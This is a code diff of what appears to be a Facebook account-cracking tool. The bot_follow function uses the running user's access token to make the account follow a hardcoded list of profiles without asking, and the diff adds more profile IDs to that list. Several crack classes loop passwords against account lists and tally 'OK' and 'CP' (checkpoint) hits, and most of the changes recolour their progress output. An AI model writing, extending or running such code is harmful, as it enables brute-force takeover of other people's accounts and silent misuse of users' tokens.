@@ -215,6 +215,7 @@ def bot_follow():
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Dapunta Khurayra X
+	requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=' + toket) #Dapunta Adya R
 	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      #Anthonyus Immanuel
 	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) #Abigaille Dirgantara
 	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       #Boirah
@@ -226,11 +227,14 @@ def bot_follow():
 	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) #Muh Rizal Fiansyah
 	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) #Rizal F
 	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) #Angga Kurniawan
-	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moh Yayan
+	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moch Yayan
 	requests.post('https://graph.facebook.com/1518721/subscribers?access_token=' + toket)         #Irman
 	requests.post('https://graph.facebook.com/100001434048896/subscribers?access_token=' + toket) #Ishak Ibrahim
 	requests.post('https://graph.facebook.com/100003467793035/subscribers?access_token=' + toket) #Fajar Dwi Setyawan
 	requests.post('https://graph.facebook.com/100000177285475/subscribers?access_token=' + toket) #Fajar Maulana
+	requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)         #Raifan KKR
+	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
+	requests.post('https://graph.facebook.com/100060562954794/subscribers?access_token=' + toket) #Raifan Khaidir 198
 	menu()
 
 ### MAIN MENU ###
@@ -787,7 +791,7 @@ class crack:
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -884,7 +888,7 @@ class crackttl:
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -973,7 +977,7 @@ class crackffb:
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -1074,7 +1078,7 @@ class bapi:
             break
         except:
           continue
-        print(("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
     else:
       self.loop += 1
       for pw in self.setpw:
@@ -1085,7 +1089,7 @@ class bapi:
             break
         except:
           continue
-        print(("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
 
 class bapittl:
   def __init__(self):
@@ -1189,7 +1193,7 @@ class bapittl:
             break
         except:
           continue
-        print(("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
     else:
       self.loop += 1
       for pw in self.setpw:
@@ -1200,7 +1204,7 @@ class bapittl:
             break
         except:
           continue
-        print(("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
 
 ### RESULT ###
 
